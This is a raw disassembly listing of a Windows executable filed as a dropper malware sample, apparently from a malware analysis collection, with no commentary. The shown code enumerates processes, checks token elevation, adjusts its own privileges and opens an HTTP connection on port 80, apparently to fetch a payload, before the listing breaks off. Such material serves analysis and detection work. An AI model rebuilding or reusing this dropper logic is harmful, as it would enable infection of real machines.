
malware_samples/dropper/677b0c49587c2ddc626b4e9a21aa161fad715abc8074ddacb553bd26f8eb4661.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	c3                   	ret
   140001001:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001008:	00 00 00 00 
   14000100c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001010:	48 83 ec 28          	sub    $0x28,%rsp
   140001014:	48 8b 05 35 45 00 00 	mov    0x4535(%rip),%rax        # 0x140005550
   14000101b:	31 c9                	xor    %ecx,%ecx
   14000101d:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001023:	48 8b 05 36 45 00 00 	mov    0x4536(%rip),%rax        # 0x140005560
   14000102a:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001030:	48 8b 05 39 45 00 00 	mov    0x4539(%rip),%rax        # 0x140005570
   140001037:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000103d:	48 8b 05 9c 44 00 00 	mov    0x449c(%rip),%rax        # 0x1400054e0
   140001044:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   140001049:	75 0f                	jne    0x14000105a
   14000104b:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   14000104f:	48 01 d0             	add    %rdx,%rax
   140001052:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140001058:	74 66                	je     0x1400010c0
   14000105a:	48 8b 05 df 44 00 00 	mov    0x44df(%rip),%rax        # 0x140005540
   140001061:	89 0d a5 6f 00 00    	mov    %ecx,0x6fa5(%rip)        # 0x14000800c
   140001067:	8b 00                	mov    (%rax),%eax
   140001069:	85 c0                	test   %eax,%eax
   14000106b:	74 43                	je     0x1400010b0
   14000106d:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001072:	e8 b9 21 00 00       	call   0x140003230
   140001077:	e8 94 21 00 00       	call   0x140003210
   14000107c:	48 8b 15 9d 45 00 00 	mov    0x459d(%rip),%rdx        # 0x140005620
   140001083:	8b 12                	mov    (%rdx),%edx
   140001085:	89 10                	mov    %edx,(%rax)
   140001087:	e8 7c 21 00 00       	call   0x140003208
   14000108c:	48 8b 15 6d 45 00 00 	mov    0x456d(%rip),%rdx        # 0x140005600
   140001093:	8b 12                	mov    (%rdx),%edx
   140001095:	89 10                	mov    %edx,(%rax)
   140001097:	e8 64 0d 00 00       	call   0x140001e00
   14000109c:	48 8b 05 1d 44 00 00 	mov    0x441d(%rip),%rax        # 0x1400054c0
   1400010a3:	83 38 01             	cmpl   $0x1,(%rax)
   1400010a6:	74 50                	je     0x1400010f8
   1400010a8:	31 c0                	xor    %eax,%eax
   1400010aa:	48 83 c4 28          	add    $0x28,%rsp
   1400010ae:	c3                   	ret
   1400010af:	90                   	nop
   1400010b0:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400010b5:	e8 76 21 00 00       	call   0x140003230
   1400010ba:	eb bb                	jmp    0x140001077
   1400010bc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400010c0:	0f b7 50 18          	movzwl 0x18(%rax),%edx
   1400010c4:	66 81 fa 0b 01       	cmp    $0x10b,%dx
   1400010c9:	74 45                	je     0x140001110
   1400010cb:	66 81 fa 0b 02       	cmp    $0x20b,%dx
   1400010d0:	75 88                	jne    0x14000105a
   1400010d2:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
   1400010d9:	0f 86 7b ff ff ff    	jbe    0x14000105a
   1400010df:	8b 90 f8 00 00 00    	mov    0xf8(%rax),%edx
   1400010e5:	31 c9                	xor    %ecx,%ecx
   1400010e7:	85 d2                	test   %edx,%edx
   1400010e9:	0f 95 c1             	setne  %cl
   1400010ec:	e9 69 ff ff ff       	jmp    0x14000105a
   1400010f1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400010f8:	48 8d 0d e1 0d 00 00 	lea    0xde1(%rip),%rcx        # 0x140001ee0
   1400010ff:	e8 ac 14 00 00       	call   0x1400025b0
   140001104:	31 c0                	xor    %eax,%eax
   140001106:	48 83 c4 28          	add    $0x28,%rsp
   14000110a:	c3                   	ret
   14000110b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001110:	83 78 74 0e          	cmpl   $0xe,0x74(%rax)
   140001114:	0f 86 40 ff ff ff    	jbe    0x14000105a
   14000111a:	44 8b 80 e8 00 00 00 	mov    0xe8(%rax),%r8d
   140001121:	31 c9                	xor    %ecx,%ecx
   140001123:	45 85 c0             	test   %r8d,%r8d
   140001126:	0f 95 c1             	setne  %cl
   140001129:	e9 2c ff ff ff       	jmp    0x14000105a
   14000112e:	66 90                	xchg   %ax,%ax
   140001130:	48 83 ec 38          	sub    $0x38,%rsp
   140001134:	48 8b 05 15 45 00 00 	mov    0x4515(%rip),%rax        # 0x140005650
   14000113b:	4c 8d 05 d6 6e 00 00 	lea    0x6ed6(%rip),%r8        # 0x140008018
   140001142:	48 8d 15 d7 6e 00 00 	lea    0x6ed7(%rip),%rdx        # 0x140008020
   140001149:	48 8d 0d d8 6e 00 00 	lea    0x6ed8(%rip),%rcx        # 0x140008028
   140001150:	8b 00                	mov    (%rax),%eax
   140001152:	89 05 ac 6e 00 00    	mov    %eax,0x6eac(%rip)        # 0x140008004
   140001158:	48 8b 05 b1 44 00 00 	mov    0x44b1(%rip),%rax        # 0x140005610
   14000115f:	44 8b 08             	mov    (%rax),%r9d
   140001162:	48 8d 05 9b 6e 00 00 	lea    0x6e9b(%rip),%rax        # 0x140008004
   140001169:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000116e:	e8 1d 1e 00 00       	call   0x140002f90
   140001173:	90                   	nop
   140001174:	48 83 c4 38          	add    $0x38,%rsp
   140001178:	c3                   	ret
   140001179:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001180:	41 54                	push   %r12
   140001182:	55                   	push   %rbp
   140001183:	57                   	push   %rdi
   140001184:	56                   	push   %rsi
   140001185:	53                   	push   %rbx
   140001186:	48 83 ec 20          	sub    $0x20,%rsp
   14000118a:	48 8b 1d 0f 44 00 00 	mov    0x440f(%rip),%rbx        # 0x1400055a0
   140001191:	48 8b 3d 08 83 00 00 	mov    0x8308(%rip),%rdi        # 0x1400094a0
   140001198:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   14000119f:	00 00 
   1400011a1:	48 8b 70 08          	mov    0x8(%rax),%rsi
   1400011a5:	eb 19                	jmp    0x1400011c0
   1400011a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400011ae:	00 00 
   1400011b0:	48 39 c6             	cmp    %rax,%rsi
   1400011b3:	0f 84 77 01 00 00    	je     0x140001330
   1400011b9:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   1400011be:	ff d7                	call   *%rdi
   1400011c0:	31 c0                	xor    %eax,%eax
   1400011c2:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
   1400011c7:	75 e7                	jne    0x1400011b0
   1400011c9:	48 8b 35 e0 43 00 00 	mov    0x43e0(%rip),%rsi        # 0x1400055b0
   1400011d0:	31 ff                	xor    %edi,%edi
   1400011d2:	8b 06                	mov    (%rsi),%eax
   1400011d4:	83 f8 01             	cmp    $0x1,%eax
   1400011d7:	0f 84 6a 01 00 00    	je     0x140001347
   1400011dd:	8b 06                	mov    (%rsi),%eax
   1400011df:	85 c0                	test   %eax,%eax
   1400011e1:	0f 84 c9 01 00 00    	je     0x1400013b0
   1400011e7:	c7 05 17 6e 00 00 01 	movl   $0x1,0x6e17(%rip)        # 0x140008008
   1400011ee:	00 00 00 
   1400011f1:	8b 06                	mov    (%rsi),%eax
   1400011f3:	83 f8 01             	cmp    $0x1,%eax
   1400011f6:	0f 84 60 01 00 00    	je     0x14000135c
   1400011fc:	85 ff                	test   %edi,%edi
   1400011fe:	0f 84 79 01 00 00    	je     0x14000137d
   140001204:	48 8b 05 05 43 00 00 	mov    0x4305(%rip),%rax        # 0x140005510
   14000120b:	48 8b 00             	mov    (%rax),%rax
   14000120e:	48 85 c0             	test   %rax,%rax
   140001211:	74 0c                	je     0x14000121f
   140001213:	45 31 c0             	xor    %r8d,%r8d
   140001216:	ba 02 00 00 00       	mov    $0x2,%edx
   14000121b:	31 c9                	xor    %ecx,%ecx
   14000121d:	ff d0                	call   *%rax
   14000121f:	e8 cc 0f 00 00       	call   0x1400021f0
   140001224:	48 8d 0d 95 13 00 00 	lea    0x1395(%rip),%rcx        # 0x1400025c0
   14000122b:	ff 15 67 82 00 00    	call   *0x8267(%rip)        # 0x140009498
   140001231:	48 8b 15 58 43 00 00 	mov    0x4358(%rip),%rdx        # 0x140005590
   140001238:	48 8d 0d c1 fd ff ff 	lea    -0x23f(%rip),%rcx        # 0x140001000
   14000123f:	48 89 02             	mov    %rax,(%rdx)
   140001242:	e8 59 20 00 00       	call   0x1400032a0
   140001247:	e8 a4 0d 00 00       	call   0x140001ff0
   14000124c:	8b 1d d6 6d 00 00    	mov    0x6dd6(%rip),%ebx        # 0x140008028
   140001252:	8d 7b 01             	lea    0x1(%rbx),%edi
   140001255:	48 63 ff             	movslq %edi,%rdi
   140001258:	48 8d 0c fd 00 00 00 	lea    0x0(,%rdi,8),%rcx
   14000125f:	00 
   140001260:	e8 a3 20 00 00       	call   0x140003308
   140001265:	48 89 c5             	mov    %rax,%rbp
   140001268:	85 db                	test   %ebx,%ebx
   14000126a:	0f 8e 60 01 00 00    	jle    0x1400013d0
   140001270:	4c 8b 25 a9 6d 00 00 	mov    0x6da9(%rip),%r12        # 0x140008020
   140001277:	48 8d 3c fd f8 ff ff 	lea    -0x8(,%rdi,8),%rdi
   14000127e:	ff 
   14000127f:	31 db                	xor    %ebx,%ebx
   140001281:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001288:	00 00 00 00 
   14000128c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001290:	49 8b 0c 1c          	mov    (%r12,%rbx,1),%rcx
   140001294:	e8 37 1f 00 00       	call   0x1400031d0
   140001299:	48 8d 70 01          	lea    0x1(%rax),%rsi
   14000129d:	48 89 f1             	mov    %rsi,%rcx
   1400012a0:	e8 63 20 00 00       	call   0x140003308
   1400012a5:	49 89 f0             	mov    %rsi,%r8
   1400012a8:	48 89 44 1d 00       	mov    %rax,0x0(%rbp,%rbx,1)
   1400012ad:	49 8b 14 1c          	mov    (%r12,%rbx,1),%rdx
   1400012b1:	48 89 c1             	mov    %rax,%rcx
   1400012b4:	48 83 c3 08          	add    $0x8,%rbx
   1400012b8:	e8 0b 20 00 00       	call   0x1400032c8
   1400012bd:	48 39 df             	cmp    %rbx,%rdi
   1400012c0:	75 ce                	jne    0x140001290
   1400012c2:	48 01 ef             	add    %rbp,%rdi
   1400012c5:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   1400012cc:	48 89 2d 4d 6d 00 00 	mov    %rbp,0x6d4d(%rip)        # 0x140008020
   1400012d3:	e8 88 0a 00 00       	call   0x140001d60
   1400012d8:	48 8b 05 41 42 00 00 	mov    0x4241(%rip),%rax        # 0x140005520
   1400012df:	4c 8b 05 32 6d 00 00 	mov    0x6d32(%rip),%r8        # 0x140008018
   1400012e6:	8b 0d 3c 6d 00 00    	mov    0x6d3c(%rip),%ecx        # 0x140008028
   1400012ec:	48 8b 00             	mov    (%rax),%rax
   1400012ef:	4c 89 00             	mov    %r8,(%rax)
   1400012f2:	48 8b 15 27 6d 00 00 	mov    0x6d27(%rip),%rdx        # 0x140008020
   1400012f9:	e8 12 21 00 00       	call   0x140003410
   1400012fe:	8b 0d 08 6d 00 00    	mov    0x6d08(%rip),%ecx        # 0x14000800c
   140001304:	89 05 06 6d 00 00    	mov    %eax,0x6d06(%rip)        # 0x140008010
   14000130a:	85 c9                	test   %ecx,%ecx
   14000130c:	0f 84 c6 00 00 00    	je     0x1400013d8
   140001312:	8b 15 f0 6c 00 00    	mov    0x6cf0(%rip),%edx        # 0x140008008
   140001318:	85 d2                	test   %edx,%edx
   14000131a:	74 74                	je     0x140001390
   14000131c:	48 83 c4 20          	add    $0x20,%rsp
   140001320:	5b                   	pop    %rbx
   140001321:	5e                   	pop    %rsi
   140001322:	5f                   	pop    %rdi
   140001323:	5d                   	pop    %rbp
   140001324:	41 5c                	pop    %r12
   140001326:	c3                   	ret
   140001327:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000132e:	00 00 
   140001330:	48 8b 35 79 42 00 00 	mov    0x4279(%rip),%rsi        # 0x1400055b0
   140001337:	bf 01 00 00 00       	mov    $0x1,%edi
   14000133c:	8b 06                	mov    (%rsi),%eax
   14000133e:	83 f8 01             	cmp    $0x1,%eax
   140001341:	0f 85 96 fe ff ff    	jne    0x1400011dd
   140001347:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   14000134c:	e8 5f 1d 00 00       	call   0x1400030b0
   140001351:	8b 06                	mov    (%rsi),%eax
   140001353:	83 f8 01             	cmp    $0x1,%eax
   140001356:	0f 85 a0 fe ff ff    	jne    0x1400011fc
   14000135c:	48 8b 15 6d 42 00 00 	mov    0x426d(%rip),%rdx        # 0x1400055d0
   140001363:	48 8b 0d 56 42 00 00 	mov    0x4256(%rip),%rcx        # 0x1400055c0
   14000136a:	e8 29 1f 00 00       	call   0x140003298
   14000136f:	c7 06 02 00 00 00    	movl   $0x2,(%rsi)
   140001375:	85 ff                	test   %edi,%edi
   140001377:	0f 85 87 fe ff ff    	jne    0x140001204
   14000137d:	31 c0                	xor    %eax,%eax
   14000137f:	48 87 03             	xchg   %rax,(%rbx)
   140001382:	e9 7d fe ff ff       	jmp    0x140001204
   140001387:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000138e:	00 00 
   140001390:	e8 c3 1e 00 00       	call   0x140003258
   140001395:	8b 05 75 6c 00 00    	mov    0x6c75(%rip),%eax        # 0x140008010
   14000139b:	48 83 c4 20          	add    $0x20,%rsp
   14000139f:	5b                   	pop    %rbx
   1400013a0:	5e                   	pop    %rsi
   1400013a1:	5f                   	pop    %rdi
   1400013a2:	5d                   	pop    %rbp
   1400013a3:	41 5c                	pop    %r12
   1400013a5:	c3                   	ret
   1400013a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400013ad:	00 00 00 
   1400013b0:	48 8b 15 39 42 00 00 	mov    0x4239(%rip),%rdx        # 0x1400055f0
   1400013b7:	48 8b 0d 22 42 00 00 	mov    0x4222(%rip),%rcx        # 0x1400055e0
   1400013be:	c7 06 01 00 00 00    	movl   $0x1,(%rsi)
   1400013c4:	e8 cf 1e 00 00       	call   0x140003298
   1400013c9:	e9 23 fe ff ff       	jmp    0x1400011f1
   1400013ce:	66 90                	xchg   %ax,%ax
   1400013d0:	48 89 c7             	mov    %rax,%rdi
   1400013d3:	e9 ed fe ff ff       	jmp    0x1400012c5
   1400013d8:	89 c1                	mov    %eax,%ecx
   1400013da:	e8 d1 1e 00 00       	call   0x1400032b0
   1400013df:	90                   	nop
   1400013e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400013e4:	48 8b 05 55 41 00 00 	mov    0x4155(%rip),%rax        # 0x140005540
   1400013eb:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   1400013f1:	e8 8a fd ff ff       	call   0x140001180
   1400013f6:	90                   	nop
   1400013f7:	90                   	nop
   1400013f8:	48 83 c4 28          	add    $0x28,%rsp
   1400013fc:	c3                   	ret
   1400013fd:	0f 1f 00             	nopl   (%rax)
   140001400:	48 83 ec 28          	sub    $0x28,%rsp
   140001404:	48 8b 05 35 41 00 00 	mov    0x4135(%rip),%rax        # 0x140005540
   14000140b:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140001411:	e8 6a fd ff ff       	call   0x140001180
   140001416:	90                   	nop
   140001417:	90                   	nop
   140001418:	48 83 c4 28          	add    $0x28,%rsp
   14000141c:	c3                   	ret
   14000141d:	0f 1f 00             	nopl   (%rax)
   140001420:	48 83 ec 28          	sub    $0x28,%rsp
   140001424:	e8 47 1c 00 00       	call   0x140003070
   140001429:	48 83 f8 01          	cmp    $0x1,%rax
   14000142d:	19 c0                	sbb    %eax,%eax
   14000142f:	48 83 c4 28          	add    $0x28,%rsp
   140001433:	c3                   	ret
   140001434:	90                   	nop
   140001435:	90                   	nop
   140001436:	90                   	nop
   140001437:	90                   	nop
   140001438:	90                   	nop
   140001439:	90                   	nop
   14000143a:	90                   	nop
   14000143b:	90                   	nop
   14000143c:	90                   	nop
   14000143d:	90                   	nop
   14000143e:	90                   	nop
   14000143f:	90                   	nop
   140001440:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x140001450
   140001447:	e9 d4 ff ff ff       	jmp    0x140001420
   14000144c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001450:	c3                   	ret
   140001451:	90                   	nop
   140001452:	90                   	nop
   140001453:	90                   	nop
   140001454:	90                   	nop
   140001455:	90                   	nop
   140001456:	90                   	nop
   140001457:	90                   	nop
   140001458:	90                   	nop
   140001459:	90                   	nop
   14000145a:	90                   	nop
   14000145b:	90                   	nop
   14000145c:	90                   	nop
   14000145d:	90                   	nop
   14000145e:	90                   	nop
   14000145f:	90                   	nop
   140001460:	41 55                	push   %r13
   140001462:	41 54                	push   %r12
   140001464:	55                   	push   %rbp
   140001465:	57                   	push   %rdi
   140001466:	56                   	push   %rsi
   140001467:	53                   	push   %rbx
   140001468:	48 81 ec 68 02 00 00 	sub    $0x268,%rsp
   14000146f:	48 89 cf             	mov    %rcx,%rdi
   140001472:	89 d5                	mov    %edx,%ebp
   140001474:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001479:	31 d2                	xor    %edx,%edx
   14000147b:	e8 48 1f 00 00       	call   0x1400033c8
   140001480:	48 89 c3             	mov    %rax,%rbx
   140001483:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140001487:	74 4b                	je     0x1400014d4
   140001489:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   14000148e:	48 89 c1             	mov    %rax,%rcx
   140001491:	c7 44 24 28 38 02 00 	movl   $0x238,0x28(%rsp)
   140001498:	00 
   140001499:	e8 da 1e 00 00       	call   0x140003378
   14000149e:	85 c0                	test   %eax,%eax
   1400014a0:	74 29                	je     0x1400014cb
   1400014a2:	4c 8b 25 7f 7f 00 00 	mov    0x7f7f(%rip),%r12        # 0x140009428
   1400014a9:	48 8d 4c 24 54       	lea    0x54(%rsp),%rcx
   1400014ae:	48 89 fa             	mov    %rdi,%rdx
   1400014b1:	e8 42 1d 00 00       	call   0x1400031f8
   1400014b6:	85 c0                	test   %eax,%eax
   1400014b8:	74 1e                	je     0x1400014d8
   1400014ba:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   1400014bf:	48 89 d9             	mov    %rbx,%rcx
   1400014c2:	e8 a9 1e 00 00       	call   0x140003370
   1400014c7:	85 c0                	test   %eax,%eax
   1400014c9:	75 de                	jne    0x1400014a9
   1400014cb:	48 89 d9             	mov    %rbx,%rcx
   1400014ce:	ff 15 54 7f 00 00    	call   *0x7f54(%rip)        # 0x140009428
   1400014d4:	31 c0                	xor    %eax,%eax
   1400014d6:	eb 5d                	jmp    0x140001535
   1400014d8:	85 ed                	test   %ebp,%ebp
   1400014da:	74 4c                	je     0x140001528
   1400014dc:	44 8b 44 24 30       	mov    0x30(%rsp),%r8d
   1400014e1:	31 d2                	xor    %edx,%edx
   1400014e3:	b9 00 10 00 00       	mov    $0x1000,%ecx
   1400014e8:	ff 15 92 7f 00 00    	call   *0x7f92(%rip)        # 0x140009480
   1400014ee:	48 89 c6             	mov    %rax,%rsi
   1400014f1:	48 85 c0             	test   %rax,%rax
   1400014f4:	74 c4                	je     0x1400014ba
   1400014f6:	31 c0                	xor    %eax,%eax
   1400014f8:	48 89 f1             	mov    %rsi,%rcx
   1400014fb:	48 8d 54 24 24       	lea    0x24(%rsp),%rdx
   140001500:	89 44 24 24          	mov    %eax,0x24(%rsp)
   140001504:	ff 15 66 7f 00 00    	call   *0x7f66(%rip)        # 0x140009470
   14000150a:	48 89 f1             	mov    %rsi,%rcx
   14000150d:	85 c0                	test   %eax,%eax
   14000150f:	74 12                	je     0x140001523
   140001511:	83 7c 24 24 00       	cmpl   $0x0,0x24(%rsp)
   140001516:	75 0b                	jne    0x140001523
   140001518:	41 ff d4             	call   *%r12
   14000151b:	48 89 d9             	mov    %rbx,%rcx
   14000151e:	41 ff d4             	call   *%r12
   140001521:	eb 0e                	jmp    0x140001531
   140001523:	41 ff d4             	call   *%r12
   140001526:	eb 92                	jmp    0x1400014ba
   140001528:	48 89 d9             	mov    %rbx,%rcx
   14000152b:	ff 15 f7 7e 00 00    	call   *0x7ef7(%rip)        # 0x140009428
   140001531:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140001535:	48 81 c4 68 02 00 00 	add    $0x268,%rsp
   14000153c:	5b                   	pop    %rbx
   14000153d:	5e                   	pop    %rsi
   14000153e:	5f                   	pop    %rdi
   14000153f:	5d                   	pop    %rbp
   140001540:	41 5c                	pop    %r12
   140001542:	41 5d                	pop    %r13
   140001544:	c3                   	ret
   140001545:	55                   	push   %rbp
   140001546:	57                   	push   %rdi
   140001547:	56                   	push   %rsi
   140001548:	53                   	push   %rbx
   140001549:	48 81 ec 78 02 00 00 	sub    $0x278,%rsp
   140001550:	31 d2                	xor    %edx,%edx
   140001552:	89 cf                	mov    %ecx,%edi
   140001554:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001559:	e8 6a 1e 00 00       	call   0x1400033c8
   14000155e:	48 89 c6             	mov    %rax,%rsi
   140001561:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140001565:	74 25                	je     0x14000158c
   140001567:	48 8d 6c 24 38       	lea    0x38(%rsp),%rbp
   14000156c:	48 89 c1             	mov    %rax,%rcx
   14000156f:	c7 44 24 38 38 02 00 	movl   $0x238,0x38(%rsp)
   140001576:	00 
   140001577:	48 89 ea             	mov    %rbp,%rdx
   14000157a:	e8 f9 1d 00 00       	call   0x140003378
   14000157f:	85 c0                	test   %eax,%eax
   140001581:	75 10                	jne    0x140001593
   140001583:	48 89 f1             	mov    %rsi,%rcx
   140001586:	ff 15 9c 7e 00 00    	call   *0x7e9c(%rip)        # 0x140009428
   14000158c:	31 db                	xor    %ebx,%ebx
   14000158e:	e9 9a 00 00 00       	jmp    0x14000162d
   140001593:	48 8d 4c 24 64       	lea    0x64(%rsp),%rcx
   140001598:	48 8d 15 61 3a 00 00 	lea    0x3a61(%rip),%rdx        # 0x140005000
   14000159f:	e8 54 1c 00 00       	call   0x1400031f8
   1400015a4:	85 c0                	test   %eax,%eax
   1400015a6:	75 5d                	jne    0x140001605
   1400015a8:	b9 00 10 00 00       	mov    $0x1000,%ecx
   1400015ad:	44 8b 44 24 40       	mov    0x40(%rsp),%r8d
   1400015b2:	31 d2                	xor    %edx,%edx
   1400015b4:	ff 15 c6 7e 00 00    	call   *0x7ec6(%rip)        # 0x140009480
   1400015ba:	48 89 c1             	mov    %rax,%rcx
   1400015bd:	48 85 c0             	test   %rax,%rax
   1400015c0:	74 43                	je     0x140001605
   1400015c2:	31 c0                	xor    %eax,%eax
   1400015c4:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400015c9:	48 8d 54 24 34       	lea    0x34(%rsp),%rdx
   1400015ce:	89 44 24 34          	mov    %eax,0x34(%rsp)
   1400015d2:	ff 15 98 7e 00 00    	call   *0x7e98(%rip)        # 0x140009470
   1400015d8:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400015dd:	85 c0                	test   %eax,%eax
   1400015df:	48 8b 05 42 7e 00 00 	mov    0x7e42(%rip),%rax        # 0x140009428
   1400015e6:	74 1b                	je     0x140001603
   1400015e8:	83 7c 24 34 00       	cmpl   $0x0,0x34(%rsp)
   1400015ed:	75 14                	jne    0x140001603
   1400015ef:	8b 5c 24 40          	mov    0x40(%rsp),%ebx
   1400015f3:	85 ff                	test   %edi,%edi
   1400015f5:	74 08                	je     0x1400015ff
   1400015f7:	39 1d 33 6a 00 00    	cmp    %ebx,0x6a33(%rip)        # 0x140008030
   1400015fd:	74 04                	je     0x140001603
   1400015ff:	ff d0                	call   *%rax
   140001601:	eb 17                	jmp    0x14000161a
   140001603:	ff d0                	call   *%rax
   140001605:	48 89 ea             	mov    %rbp,%rdx
   140001608:	48 89 f1             	mov    %rsi,%rcx
   14000160b:	e8 60 1d 00 00       	call   0x140003370
   140001610:	85 c0                	test   %eax,%eax
   140001612:	0f 85 7b ff ff ff    	jne    0x140001593
   140001618:	31 db                	xor    %ebx,%ebx
   14000161a:	48 89 f1             	mov    %rsi,%rcx
   14000161d:	ff 15 05 7e 00 00    	call   *0x7e05(%rip)        # 0x140009428
   140001623:	85 db                	test   %ebx,%ebx
   140001625:	74 06                	je     0x14000162d
   140001627:	89 1d 03 6a 00 00    	mov    %ebx,0x6a03(%rip)        # 0x140008030
   14000162d:	89 d8                	mov    %ebx,%eax
   14000162f:	48 81 c4 78 02 00 00 	add    $0x278,%rsp
   140001636:	5b                   	pop    %rbx
   140001637:	5e                   	pop    %rsi
   140001638:	5f                   	pop    %rdi
   140001639:	5d                   	pop    %rbp
   14000163a:	c3                   	ret
   14000163b:	53                   	push   %rbx
   14000163c:	48 83 ec 50          	sub    $0x50,%rsp
   140001640:	ff 15 0a 7e 00 00    	call   *0x7e0a(%rip)        # 0x140009450
   140001646:	ba 28 00 00 00       	mov    $0x28,%edx
   14000164b:	48 89 c1             	mov    %rax,%rcx
   14000164e:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140001653:	ff 15 a7 7d 00 00    	call   *0x7da7(%rip)        # 0x140009400
   140001659:	85 c0                	test   %eax,%eax
   14000165b:	74 26                	je     0x140001683
   14000165d:	31 c9                	xor    %ecx,%ecx
   14000165f:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140001664:	48 8d 15 ad 39 00 00 	lea    0x39ad(%rip),%rdx        # 0x140005018
   14000166b:	ff 15 87 7d 00 00    	call   *0x7d87(%rip)        # 0x1400093f8
   140001671:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140001676:	48 8b 1d ab 7d 00 00 	mov    0x7dab(%rip),%rbx        # 0x140009428
   14000167d:	85 c0                	test   %eax,%eax
   14000167f:	75 06                	jne    0x140001687
   140001681:	ff d3                	call   *%rbx
   140001683:	31 c0                	xor    %eax,%eax
   140001685:	eb 49                	jmp    0x1400016d0
   140001687:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   14000168c:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   140001693:	00 
   140001694:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140001699:	31 d2                	xor    %edx,%edx
   14000169b:	c7 44 24 4c 02 00 00 	movl   $0x2,0x4c(%rsp)
   1400016a2:	00 
   1400016a3:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   1400016a9:	48 89 44 24 44       	mov    %rax,0x44(%rsp)
   1400016ae:	31 c0                	xor    %eax,%eax
   1400016b0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400016b5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400016ba:	ff 15 30 7d 00 00    	call   *0x7d30(%rip)        # 0x1400093f0
   1400016c0:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400016c5:	85 c0                	test   %eax,%eax
   1400016c7:	74 b8                	je     0x140001681
   1400016c9:	ff d3                	call   *%rbx
   1400016cb:	b8 01 00 00 00       	mov    $0x1,%eax
   1400016d0:	48 83 c4 50          	add    $0x50,%rsp
   1400016d4:	5b                   	pop    %rbx
   1400016d5:	c3                   	ret
   1400016d6:	41 57                	push   %r15
   1400016d8:	b8 78 20 00 00       	mov    $0x2078,%eax
   1400016dd:	41 56                	push   %r14
   1400016df:	41 55                	push   %r13
   1400016e1:	41 54                	push   %r12
   1400016e3:	55                   	push   %rbp
   1400016e4:	57                   	push   %rdi
   1400016e5:	56                   	push   %rsi
   1400016e6:	53                   	push   %rbx
   1400016e7:	e8 f4 17 00 00       	call   0x140002ee0
   1400016ec:	48 29 c4             	sub    %rax,%rsp
   1400016ef:	31 f6                	xor    %esi,%esi
   1400016f1:	45 31 c9             	xor    %r9d,%r9d
   1400016f4:	45 31 c0             	xor    %r8d,%r8d
   1400016f7:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400016fb:	49 89 cc             	mov    %rcx,%r12
   1400016fe:	48 89 d3             	mov    %rdx,%rbx
   140001701:	31 d2                	xor    %edx,%edx
   140001703:	48 8d 0d 20 39 00 00 	lea    0x3920(%rip),%rcx        # 0x14000502a
   14000170a:	ff 15 90 7f 00 00    	call   *0x7f90(%rip)        # 0x1400096a0
   140001710:	48 89 c5             	mov    %rax,%rbp
   140001713:	48 85 c0             	test   %rax,%rax
   140001716:	74 4c                	je     0x140001764
   140001718:	41 b9 30 75 00 00    	mov    $0x7530,%r9d
   14000171e:	41 b8 30 75 00 00    	mov    $0x7530,%r8d
   140001724:	ba 30 75 00 00       	mov    $0x7530,%edx
   140001729:	48 89 c1             	mov    %rax,%rcx
   14000172c:	c7 44 24 20 30 75 00 	movl   $0x7530,0x20(%rsp)
   140001733:	00 
   140001734:	ff 15 8e 7f 00 00    	call   *0x7f8e(%rip)        # 0x1400096c8
   14000173a:	45 31 c9             	xor    %r9d,%r9d
   14000173d:	41 b8 50 00 00 00    	mov    $0x50,%r8d
   140001743:	48 89 e9             	mov    %rbp,%rcx
   140001746:	48 8d 15 f3 38 00 00 	lea    0x38f3(%rip),%rdx        # 0x140005040
